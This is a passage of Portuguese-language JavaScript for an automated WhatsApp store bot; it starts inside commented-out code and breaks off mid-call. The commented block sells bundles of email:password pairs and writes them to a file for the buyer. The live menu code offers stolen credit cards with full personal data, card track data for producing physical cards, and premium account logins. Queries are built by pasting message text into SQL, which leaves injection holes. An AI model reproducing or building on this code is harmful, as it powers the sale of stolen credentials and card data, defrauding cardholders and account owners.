        //             await client.sendListMessage(Mensagem_From, {
        //                 buttonText: `PACOTES ${PROVEDOR}`,
        //                 description: Texto,
        //                 sections: [
        //                     {
        //                         title: `PACOTES ${PROVEDOR}`,
        //                         rows: Array_Botoes
        //                     },
        //                 ],
        //             }).then(async (result) => {
        //                 await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|liberar_esta_interacao_se_for_antiga' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             })
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if ((Mensagem_Tipo).toString() === "list_response" && Mensagem_Texto.indexOf("📧 PREÇO: R$: ") > -1) {

        //             if (Mensagem_Texto.indexOf("PACOTES YAHOO") > -1) {
        //                 PROVEDOR = "YAHOO"
        //             }
        //             if (Mensagem_Texto.indexOf("PACOTES HOTMAIL") > -1) {
        //                 PROVEDOR = "HOTMAIL"
        //             }

        //             try {
        //                 Div = Mensagem_Texto.split("Quantidade: ")
        //                 QUANTIDADE_PACOTE = Div[1].split(",")
        //                 QUANTIDADE_PACOTE = QUANTIDADE_PACOTE[0]

        //                 //QUANTIDADE_PACOTE = QUANTIDADE_PACOTE.replace(/[^0-9\.]/igm, '')

        //                 Div = Mensagem_Texto.split("R$: ")
        //                 VALOR_PACOTE = Div[1].split("💰")
        //                 VALOR_PACOTE = VALOR_PACOTE[0]
        //                 VALOR_PACOTE = parseFloat(VALOR_PACOTE).toFixed(2)
        //                 console.log(VALOR_PACOTE)

        //                 console.log(`PROVEDOR: ${PROVEDOR} | QUANTIDADE_PACOTE: ${QUANTIDADE_PACOTE} | VALOR PACOTE: ${VALOR_PACOTE}`)
        //             } catch (error) {
        //                 console.log(error)
        //                 await Menu(client, Numero, Mensagem_From)
        //                 Item_Fila_Sendo_Processado = "0"; return
        //             }

        //             Estoque = await DataBase_Better.prepare(`SELECT COUNT(*) FROM EMAIL WHERE PROVEDOR = '${PROVEDOR}'`).get()

        //             console.log(`Estoque = ${(Estoque["COUNT(*)"])} | QUANTIDADE = ${QUANTIDADE_PACOTE}`)

        //             if (parseFloat(QUANTIDADE_PACOTE) > parseFloat(Estoque["COUNT(*)"])) {

        //                 Texto = `⚠️ *Quantidade de Emails ${PROVEDOR} no estoque é inferior a quantidade escolhida por você!*

        // ⚙️ *NOSSA EQUIPE FOI NOTIFICADA* ⚙️

        // *Em breve o estoque será reabastecido*📦✅`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });

        //                 for await (adm of Adms) {
        //                     Texto = `⚠️*ATENÇÃO ADM*⚠️

        // *USUÁRIO wa.me/${Numero} TENTOU COMPRAR ${QUANTIDADE_PACOTE} ${PROVEDOR}, MAS SÓ TEM ${Estoque["COUNT(*)"]} NO ESTOQUE.*`
        //                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                     }).catch(async(erro) => {
        //                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                     });
        //                 }
        //                 return
        //             }

        //             SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        //             SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2);

        //             console.log(`SALDO USER: ${SALDO_USUARIO} | VALOR PACOTE: ${VALOR_PACOTE}`)

        //             if (parseFloat(SALDO_USUARIO) < parseFloat(VALOR_PACOTE)) {

        //                 Texto = `⚠️*Você não possui saldo suficiente para comprar este pacote de Email ${PROVEDOR}.*`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });


        //                 MIN_RECARGA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'MIN_RECARGA'`).get()["VALOR"]
        //                 Exemplo_1 = parseInt(MIN_RECARGA)
        //                 Exemplo_2 = parseInt(MIN_RECARGA) + 3
        //                 Exemplo_3 = parseInt(MIN_RECARGA) + 15
        //                 Exemplo_4 = parseInt(MIN_RECARGA) + 47

        //                 Titulo = `💰 PIX AUTOMÁTICO`
        //                 iD_Footer = Date.now()
        //                 Texto = `💰 *PIX AUTOMÁTICO - TUTORIAL*

        // *Para adicionar saldo na store,use o comando /pix, seguido da quantidade desejada.*

        // *A RECARGA MÍNIMA É: R$:${MIN_RECARGA}*

        // *EXEMPLOS:*

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_1).toFixed(2)}*
        // /pix ${Exemplo_1}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_2).toFixed(2)}*
        // /pix ${Exemplo_2}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_3).toFixed(2)}*
        // /pix ${Exemplo_3}

        // *Para criar um pagamento de R$:${parseFloat(Exemplo_4).toFixed(2)}*
        // /pix ${Exemplo_4}


        // *VOCÊ PODE RECARREGAR O QUANTO QUISER A CIMA DE R$:${MIN_RECARGA}, SÓ TROCAR O VALOR DO COMANDO...*

        // Após o envio do comando, será gerado um código pix "Copia e Cola", para qual você irá efetuar o pagamento utilizando o aplicativo do seu banco de preferência, na sessão: Pix > Copia e Cola
        // `

        //                 await client.sendListMessage(Mensagem_From, {
        //                     buttonText: 'OPÇÕES',
        //                     description: Texto,
        //                     sections: [
        //                         {
        //                             title: "OPÇÕES",
        //                             rows: [
        //                                 {
        //                                     rowId: `${iD_Footer.toString()}|`,
        //                                     title: "🔙 MENU",
        //                                     description: "Menu incial.",
        //                                 }
        //                             ]
        //                         },
        //                     ],
        //                 }).then(async (result) => {
        //                     await DataBase_Better.prepare(`UPDATE CONTATOS SET ID_BOTAO = '${iD_Footer.toString()}|0' WHERE ID_CONTATO = '${Mensagem_From}'`).run()
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine(erro));
        //                     console.log(debugLine("Erro = " + (JSON.stringify(erro))));
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 })
        //                 return
        //             }


        //             NOVO_SALDO = parseFloat(SALDO_USUARIO) - parseFloat(VALOR_PACOTE)
        //             NOVO_SALDO = parseFloat(NOVO_SALDO).toFixed(2);
        //             await DataBase_Better.prepare(`UPDATE CONTATOS SET SALDO = '${NOVO_SALDO}' WHERE ID_CONTATO = '${Mensagem_From}'`).run()

        //             Texto_Usuario = `📦 *PACOTE EMAIL COMPRADO!*

        // 🔸 *PROVEDOR:* ${PROVEDOR}
        // 📦 *TOTAL:* ${QUANTIDADE_PACOTE}
        // 💰 *VALOR PACOTE: R$:* ${VALOR_PACOTE}
        // `
        //             Item_Fila_Sendo_Processado_MS = Date.now()
        //             await client.sendImage(Mensagem_From, Comprou_PCT_CPF_PV, 'foto', Texto_Usuario).then(async (result) => {
        //                 //console.log('Result: ', result);
        //             }).catch(async(erro) => {
        //                 console.error('Error when sending: ', erro);
        //             });

        //             Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM EMAIL WHERE PROVEDOR = '${PROVEDOR}'`).all();
        //             shuffle(Array_MATERIAL);

        //             Data_Toda = new Date(parseInt(Date.now())).toLocaleString()
        //             Div_Data = Data_Toda.toString().split(" ")

        //             Data_File = Div_Data[0]
        //             Data_File = Data_File.toString().replace(/\//igm, ' ');
        //             Data_File = Data_File.toString().replace(/[^0-9\s]/igm, '');

        //             Hora_File = Div_Data[1]
        //             Hora_File = Hora_File.toString().replace(/\:/igm, ' ');
        //             Hora_File = Hora_File.toString().replace(/[^0-9\s]/igm, '');

        //             //Nome_Bot_File = Nome_Bot.toString().replace(/[^a-zA-Z\s]/igm, '');

        //             var Nome_File_Visual = `${QUANTIDADE_PACOTE} EMAILs ${PROVEDOR} PARA ${Numero} DATA ${Data_File} HORA ${Hora_File}.txt`
        //             var Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`
        //             Nome_File = Nome_File.replace(/\\/igm, '/');
        //             //console.log(Nome_File)

        //             const message = fs.createWriteStream(Nome_File);

        //             for (let index = 0; index < QUANTIDADE_PACOTE; index++) {

        //                 message.write(`${Array_MATERIAL[index]["EMAIL"]}:${Array_MATERIAL[index]["SENHA"]}\n\n`);

        //                 await DataBase_Better.prepare(`INSERT INTO EMAIL_VENDIDOS (EMAIL,SENHA,PROVEDOR,NUMERO_COMPRADOR,VALOR_PACOTE,QUANTIDADE_PACOTE,DATA_MS_INSERIDO) VALUES ('${Array_MATERIAL[index]["EMAIL"]}','${Array_MATERIAL[index]["SENHA"]}','${Array_MATERIAL[index]["PROVEDOR"]}','${Mensagem_From}','${VALOR_PACOTE}','${QUANTIDADE_PACOTE}','${Date.now()}')`).run()
        //                 await DataBase_Better.prepare(`DELETE FROM EMAIL WHERE EMAIL = '${Array_MATERIAL[index]["EMAIL"]}'`).run()

        //                 if (index === parseInt(QUANTIDADE_PACOTE) - 1) {
        //                     console.log("Foi")
        //                     Item_Fila_Sendo_Processado_MS = Date.now()
        //                     await DataBase_Better.prepare(`INSERT INTO PACOTES_EMAIL_VENDIDOS (PROVEDOR,QUANTIDADE,VALOR,NUMERO_COMPRADOR,DATA_INSERIDO_MS) VALUES ('${PROVEDOR}','${QUANTIDADE_PACOTE}','${VALOR_PACOTE}','${Mensagem_From}','${Date.now()}')`).run()

        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }
        //                     console.log(fs.existsSync(Nome_File))
        //                     if (fs.existsSync(Nome_File) === false) {
        //                         Item_Fila_Sendo_Processado_MS = Date.now()
        //                         await delay(3000)
        //                     }

        //                     await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                     }).catch(async(erro) => {
        //                         console.error('Error when sending1: ', erro);
        //                         try {
        //                             //await delay(10000)
        //                             await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                             }).catch(async(erro) => {
        //                                 console.error('Error when sending2: ', erro);
        //                             });
        //                         } catch (error) {
        //                             console.error('Error when sending1: ', erro);
        //                         }
        //                     });
        //                 }
        //             }



        //             /*             if (Notif_Grupo_Comprou_MIX === true) {
        //             Texto_Grupo = `📦 *USUÁRIO COMPROU UM PACOTE MIX* 📦

        //             👤 *USUÁRIO:* wa.me/${Numero}
        //             📦 *COMPROU PACOTE MIX DE* ${QUANTIDADE_PACOTE} *CCs* 

        //             ────────────────

        //             *VENHA ADQUIRIR O MELHOR MATERIAL DA NET!*

        //             *ATENDIMENTO 100% AUTOMÁTICO!*

        //             Este é o número do BOT, mande qualquer mensagem!
        //             wa.me/${NUMERO_PURO_BOT}
        //             `

        //             for await (Grupo of ID_GRUPOS) {
        //             try {
        //             await client.sendImage(Grupo["ID_GRUPO"], Comprou_PCT_CPF_GP, 'foto', Texto_Grupo).then(async (result) => {
        //             }).catch(async(erro) => {
        //             console.error('Error when sending: ', erro);
        //             });
        //             } catch (error) {
        //             }
        //             }
        //             } */

        //             Texto_Adms = `*ADMS: 📦 PACOTE EMAIL COMPRADO*

        // 👤 *NÚMERO DO USUÁRIO:* wa.me/${Numero}
        // 👤 *PROVEDOR:* ${PROVEDOR}
        // 📦 *TOTAL:* ${QUANTIDADE_PACOTE}
        // 💰 *VALOR PCT: R$:* ${VALOR_PACOTE}
        // `
        //             for await (adm of Adms) {
        //                 Texto = Texto_Adms
        //                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //             }

        //             console.log(`Pacote EMAIL Comprado Numero: wa.me/${Numero} | Quantidade: ${QUANTIDADE_PACOTE} | Valor: ${VALOR_PACOTE}`)
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


















        //NEM UMA DOS MATCHES A CIMA CHAMA MENU
        try {
            await Menu(client, Numero, Mensagem_From)
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        } catch (error) {
            console.log(debugLine(error));
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }
    }, 100);
}

















async function Menu(client, Numero, Mensagem_From) {
    try {
        TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
        if ((TIPOMENU_ATUAL).toString() === "0") {
            Texto = `*Seja bem vindo ao Bot!*

⚜️ *${Nome_Bot}* ⚜️

*ESCOLHA UM MODO DE INTERAÇÃO:*

*MODO AVANÇADO*
(Interação por Janela de Menu, Botões, Listas.)

*Digite:* /modo===a

*MODO SIMPLES*
(Interação por comandos e textos.)
(Se o Bot não o responde o menu incial, use este.)

*Digite:* /modo===s

*Obs: Pode alternar os Modos a hora que quiser, basta enviar os comandos descritos acima.*`
            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendText',
'${Texto}',
'CONSTRUCAO_LISTMESSAGE_buttonText',
'CONSTRUCAO_LISTMESSAGE_title',
'CONSTRUCAO_LISTMESSAGE_rows',
'Caminho_arquivo',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        }

        BOT_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CC'`).get()["VALOR"]
        FULLDADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FULLDADOS'`).get()["VALOR"]
        INFOCC_NORMAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'INFOCC_NORMAL'`).get()["VALOR"]
        BOT_CONSULTADA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CONSULTADA'`).get()["VALOR"]
        BOT_CONSUL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CONSUL'`).get()["VALOR"]
        BOT_LOGIN = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_LOGIN'`).get()["VALOR"]
        BOT_TRILHAS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_TRILHAS'`).get()["VALOR"]
        BOT_LARA = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_LARA'`).get()["VALOR"]
        BOT_DOC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_DOC'`).get()["VALOR"]
        BOT_CPF = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CPF'`).get()["VALOR"]
        BOT_EMAIL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_EMAIL'`).get()["VALOR"]

        TEXTO_MENU_INICIAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'TEXTO_MENU_INICIAL'`).get()["VALOR"]
        SALDO_USUARIO = await DataBase_Better.prepare(`SELECT SALDO FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["SALDO"]
        SALDO_USUARIO = parseFloat(SALDO_USUARIO).toFixed(2)

        CONSTRUCAO_LISTMESSAGE_buttonText = "MENU"
        CONSTRUCAO_LISTMESSAGE_title = `Menu inicial`
        CONSTRUCAO_LISTMESSAGE_description = `*${Nome_Bot}*

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${NUMERO_USER_CONTROLE_VISIBILIDADE}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_INICIAL}
`
        TIPOMENU_ATUAL = await DataBase_Better.prepare(`SELECT TIPOMENU_ATUAL FROM CONTATOS WHERE ID_CONTATO = '${Mensagem_From}'`).get()["TIPOMENU_ATUAL"]
        if ((TIPOMENU_ATUAL).toString() === "a") {

            CONSTRUCAO_LISTMESSAGE_rows = []
            iD_Footer = Date.now()

            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "📲 ADICIONAR SALDO",
                    description: "Adicione saldo via PIX para poder comprar seu material.",
                },
            )
            if (Nome_Dono === "Tramposo") {
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "🧝🏼‍♂️ PACK SUPER ELFO",
                        description: "PACOTE PODEROSO EXCLUSIVO CASA STORE",
                    },
                )
            }

            BOT_CC = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'BOT_CC'`).get()["VALOR"]
            if (BOT_CC === "1") {
                FULLDADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FULLDADOS'`).get()["VALOR"]
                INFOCC_NORMAL = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'INFOCC_NORMAL'`).get()["VALOR"]
                if (FULLDADOS === "1" && INFOCC_NORMAL === "1") {
                    CONSTRUCAO_LISTMESSAGE_rows.push(
                        {
                            rowId: `${iD_Footer.toString()}|menu_ccs`,
                            title: "💳 CCs",
                            description: "Catálogo de CCs disponíveis no estoque.",
                        },
                    )
                } else {
                    if (FULLDADOS === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|catalogo_ccs|fulldados`,
                                title: "💳 CCs FULL DADOS",
                                description: "CCs com dados reais do bico.",
                            },
                        )
                    }
                    if (INFOCC_NORMAL === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|catalogo_ccs`,
                                title: "💳 INFO CCs",
                                description: `CCs com dados complementares.`,
                            },
                        )
                    }
                }
            }
            if (BOT_CONSUL === "1") {
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|catalogo_consutaveis`,
                        title: "🏦 CONSULTÁVEIS",
                        description: "Consultáveis com dados completos e ótimos limites disponíveis.",
                    },
                )
            }
            if (BOT_CONSULTADA === "1") {
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|catalogo_consutadas`,
                        title: "📑 CONSULTADAS",
                        description: "CCs com informações extras, como Saldo ou dados pessoais.",
                    },
                )
            }
            if (BOT_TRILHAS === "1") {
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "📠 TRILHAS",
                        description: "Trilhas para emitir CC física.",
                    },
                )
            }
            if (BOT_LOGIN === "1") {
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|catalogo_logins`,
                        title: "📱 LOGINS/CONTAS PREMIUM",
                        description: "Contas premium, conta de lojas online, Serviços streaming e etc...",
                    },
                )
            }
            FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
            if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                if (ATIVAR_ASSOCIADOS === "1") {
                    ASSOCIADO = await DataBase_Better.prepare(`SELECT ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${Numero}@c.us'`).get()["ASSOCIADO"]
                    if ((ASSOCIADO).toString() === "1") {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|`,
                                title: "💼 ÁREA DO ASSOCIADO",
                                description: "🟢 Veja suas estatísticas de bônus, total de indicações e etc...",
                            },
                        )
                    } else {
                        CONSTRUCAO_LISTMESSAGE_rows.push(
                            {
                                rowId: `${iD_Footer.toString()}|`,
                                title: "💼 TORNE-SE UM ASSOCIADO",
                                description: "🔴 Venha lucrar conosco!",
                            },
                        )
                    }
                }
            }
            CONSTRUCAO_LISTMESSAGE_rows.push(
                {
                    rowId: `${iD_Footer.toString()}|`,
                    title: "👤 CONTATO DO SUPORTE",
                    description: "Dono do material vendido, Suporte deste Bot.",
                },
            )
            CONTATO_CRIADOR = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'CONTATO_CRIADOR'`).get()["VALOR"]
            if (CONTATO_CRIADOR === "1") {
                CONSTRUCAO_LISTMESSAGE_rows.push(
                    {
                        rowId: `${iD_Footer.toString()}|`,
                        title: "🛠️ CONTATO DO CRIADOR DO BOT",
                        description: "LEIA A REGRA ANTES DE CONTATA-LO!",
                    }
                )
            }

            await DataBase_Better.prepare(`INSERT INTO MENSAGENS_ENVIARV3 (PROCESSADO,ID_CONTATO,TIPO,TEXTO,CONSTRUCAO_LISTMESSAGE_buttonText,CONSTRUCAO_LISTMESSAGE_title,CONSTRUCAO_LISTMESSAGE_rows,Caminho_arquivo,DATA_MS_INSERIDO) VALUES (
'0',
'${Mensagem_From}',
'sendListMessage',
'${CONSTRUCAO_LISTMESSAGE_description}',
'${CONSTRUCAO_LISTMESSAGE_buttonText}',
'${CONSTRUCAO_LISTMESSAGE_title}',
'${JSON.stringify(CONSTRUCAO_LISTMESSAGE_rows)}',
'${iD_Footer}',
'${Date.now()}')`).run()
            Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));

        } else {

            Texto = `*${Nome_Bot}*

◆ ━━━━❪✪❫━━━━ ◆
❖ *Seu número:* ${NUMERO_USER_CONTROLE_VISIBILIDADE}
❖ *Saldo Atual:* R\$: ${SALDO_USUARIO}
◆ ━━━━❪✪❫━━━━ ◆

${TEXTO_MENU_INICIAL}
`

            await client.sendText(Mensagem_From, Texto).then(async (result) => {

                if (Nome_Dono === "Tramposo") {
                    OP_Elfo = "/elfo - 🧝🏼‍♂️ *PACK SUPER ELFO*\nPACOTE PODEROSO EXCLUSIVO CASA STORE\n\n"
                } else {
                    OP_Elfo = ""
                }
                if (BOT_CC === "1") {
                    if (FULLDADOS === "1") {
                        OP_CCs = "/ccs - 💳 *CCs*\nCatálogo de CCs disponíveis no estoque. #§#\n\n"
                    } else {
                        OP_CCs = "/ccs - 💳 *INFO CCs*\nCCs com dados complementares. #CC#\n\n"
                    }
                } else {
                    OP_CCs = ""
                }
                if (BOT_CONSUL === "1") {
                    OP_Consultavel = "/consultavel - 🏦 *CONSULTÁVEIS*\nConsultáveis com dados completos e ótimos limites disponíveis.\n\n"
                } else {
                    OP_Consultavel = ""
                }
                if (BOT_CONSULTADA === "1") {
                    OP_Consultada = "/consultada - 📑 *CONSULTADAS*\nTrilhas para emitir CC física.\n\n"
                } else {
                    OP_Consultada = ""
                }
                if (BOT_TRILHAS === "1") {
                    OP_Trilhas = "/trilha - 📠 *TRILHAS*\nTrilhas para emitir CC física.\n\n"
                } else {
                    OP_Trilhas = ""
                }
                if (BOT_LOGIN === "1") {
                    OP_Login = "/login - 📱 *LOGINS/CONTAS PREMIUM*\nContas premium, conta de lojas online, Serviços streaming e etc...\n\n"
                } else {
                    OP_Login = ""
                }
                FUNCAO_ASSOCIADOS_PAGO = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'FUNCAO_ASSOCIADOS_PAGO'`).get()["VALOR"]
                if (FUNCAO_ASSOCIADOS_PAGO === "1") {
                    ATIVAR_ASSOCIADOS = await DataBase_Better.prepare(`SELECT VALOR FROM SISTEMA WHERE PARAMETRO = 'ATIVAR_ASSOCIADOS'`).get()["VALOR"]
                    if (ATIVAR_ASSOCIADOS === "1") {
                        ASSOCIADO = await DataBase_Better.prepare(`SELECT ASSOCIADO FROM CONTATOS WHERE ID_CONTATO = '${Numero}@c.us'`).get()["ASSOCIADO"]
                        if ((ASSOCIADO).toString() === "1") {
                            OP_Asso = "/associado - 💼 *ÁREA DO ASSOCIADO*\n🟢 Veja suas estatísticas de bônus, total de indicações e etc...\n\n"
                        } else {
                            OP_Asso = "/socio - 💼 *TORNE-SE UM ASSOCIADO*\n🔴 Venha lucrar conosco!\n\n"
                        }
                    }
                }

                Texto = `⚜️ *COMANDOS* ⚜️

*Digite o comando da opção desejada!*
(Exemplo: Deseja adicionar saldo? digite apenas /add)

/add - 📲 *ADICIONAR SALDO*

${OP_Elfo}${OP_CCs}${OP_Consultavel}${OP_Consultada}${OP_Trilhas}${OP_Login}/suporte - 👤 *CONTATO DO SUPORTE*

/dev - 🛠️ *CONTATO DO CRIADOR DO BOT*`
                await client.sendText(Mensagem_From, Texto).then(async (result) => {
                }).catch(async(erro) => {
